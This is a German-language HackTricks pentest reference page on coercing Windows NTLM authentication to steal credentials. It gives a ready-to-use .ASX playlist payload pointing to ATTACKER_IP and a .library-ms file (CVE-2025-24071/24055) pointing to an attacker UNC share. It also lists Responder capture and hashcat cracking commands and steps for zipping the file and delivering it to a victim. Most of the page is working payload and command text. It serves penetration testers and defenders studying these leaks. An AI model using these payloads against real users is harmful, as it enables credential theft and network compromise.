# Orte, um NTLM creds zu stehlen

{{#include ../../banners/hacktricks-training.md}}

**Schau dir alle großartigen Ideen an von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — vom Herunterladen einer Microsoft Word-Datei online bis zur ntlm leaks-Quelle: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player Playlists (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine von dir kontrollierte Windows Media Player-Playlist zu öffnen oder in der Vorschau anzuzeigen, kannst du Net‑NTLMv2 leaken, indem du den Eintrag auf einen UNC-Pfad zeigst. WMP wird versuchen, das referenzierte Medium über SMB abzurufen und sich dabei implizit zu authentifizieren.

Beispiel payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Sammlung und cracking-Ablauf:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer behandelt .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Library-Definition auf einen entfernten UNC-Pfad verweist (z. B. \\attacker\share), führt schon das bloße Durchsuchen/Starten der .library-ms innerhalb des ZIP dazu, dass Explorer den UNC abfragt und NTLM-Authentifizierungsdaten an den Angreifer sendet. Das ergibt ein NetNTLMv2, das offline geknackt oder möglicherweise relayed werden kann.

Minimale .library-ms, die auf einen Angreifer-UNC zeigt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Vorgehensweise
- Erstelle die .library-ms Datei mit dem obigen XML (setze deine IP/Hostname).
- Zippe sie (on Windows: Send to → Compressed (zipped) folder) und liefere die ZIP-Datei an das Ziel.
- Starte einen NTLM capture listener und warte, bis das Opfer die .library-ms aus der ZIP öffnet.


## Referenzen
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
